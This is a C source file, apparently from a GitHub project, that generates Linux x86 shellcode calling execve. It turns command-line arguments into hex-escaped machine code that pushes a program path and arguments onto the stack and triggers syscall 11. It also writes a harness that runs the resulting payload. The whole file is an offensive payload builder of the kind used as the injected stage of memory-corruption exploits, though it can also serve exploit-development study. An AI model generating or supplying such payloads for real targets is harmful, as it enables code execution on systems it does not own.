//https://github.com/CallumBodels/Linux-x86-Execve-Shellcode-Generator
/*
*TODO Add in read me doc here
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void writeShellcodeToFile(FILE* f,char* shellcode);
char* pad(char* string, int padWithSpaces);
int calculatePaddingNeeded(char* string);
void createEmptyArray(FILE *f,int size);

int main(int argc, char *argv[]){
	if(argc > 1){
		FILE *f = fopen("output.c","w");
		fprintf(f, "#include <stdio.h>\n#include <unistd.h>\n\n//Assemlbly comments in NASM syntax.\nchar *shellcode=\"\\x31\\xc0\" //xor eax,eax\n");
		//TODO look into freeing of shellcode pointer
		char* shellcode = pad(argv[1],0);
		writeShellcodeToFile(f,shellcode);
		//TODO better explanation
		//push current stack point into ebx, aka pointer to argv[1]
		fprintf(f, "\"\\x89\\xe3\" //mov ebx,esp\n");
		createEmptyArray(f,(argc-2));

		//TODO better explanation
		//push each arg to stack and then add addr to the arg array
		for(int i = 2; i < argc; i++){
			char* shellcode = pad(argv[i],1);

			//if arg to add starts with tac
			char tac = '-';
			if( (strncmp(&tac, argv[i], 1) == 0) ){
				//only works for flags of one char length
				fprintf(f, "\"\\x50\" //push eax\n");
				fprintf(f, "\"\\x66\\x68\\x%x\\x%x\" //pushw '%c%c'\n",argv[i][0],argv[i][1],argv[i][0],argv[i][1]);
			}else{
				writeShellcodeToFile(f,shellcode);
			}
			//TODO better explanation
			//get the arg just pushed on the stacks current address and put insert the address onto the
			fprintf(f, "\"\\x89\\xe2\" //mov edx,esp\n\"\\x89\\x51\\x%x\" //mov [ecx+%d],edx\n",((i-1)*4),((i-1)*4));
		}
		//TODO better explanation
		//point the 3 arg char *const envp[] to null
		//push execve sys call number(11) into eax, and call sys interupt to execute execve
		fprintf(f, "\"\\x50\" //push eax\n\"\\x89\\xe2\" //mov edx,esp\n\"\\xb0\\x0b\" //mov al,11\n\"\\xcd\\x80\"; //int $0x80\n\nint main(){\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n}\n");
		fclose(f);
	}else{
		//TODO - Add more detail responce
		printf("%s\n","Needs args.");
	}
}

//TODO come up with a way so the methods dont need file pointer
//TODO create more useful name
void createEmptyArray(FILE* f,int size){
	for(int i = 0; i <= size; i++){
		fprintf(f, "\"\\x50\" //push eax\n");
	}
	//push ebx onto the end of the array and then save the addr of the array into  ecx
	fprintf(f, "\"\\x53\" //push ebx\n\"\\x89\\xe1\" //mov ecx,esp\n");
}

//TODO make it universal so it can deal with '-' starting args
//TODO create more useful name
void writeShellcodeToFile(FILE* f,char* shellcode){
	fprintf(f, "\"\\x50\" //push eax\n");
	for(int i = (strlen(shellcode)); i > 0; i = i - 4){
		fprintf(f,"\"\\x68\\x%x\\x%x\\x%x\\x%x\" //push '%c%c%c%c'\n",shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1],shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1]);
	}
}

//TODO two methods for one with / and other with ' '
char* pad(char* string,int padWithSpaces){
	int paddingNeeded = calculatePaddingNeeded(string);
	char* returning = calloc((paddingNeeded+strlen(string)+1),sizeof(char));

	if(padWithSpaces){
		strncpy(&returning[0],string,strlen(string));
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&returning[(i+strlen(string))]," ",1);
		}
	}else{
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&returning[i],"/",1);
		}
		strncpy(&returning[paddingNeeded],string,strlen(string));
	}

	return (returning);
}

int calculatePaddingNeeded(char* string){
	return (4 -((strlen(string))%4));
}
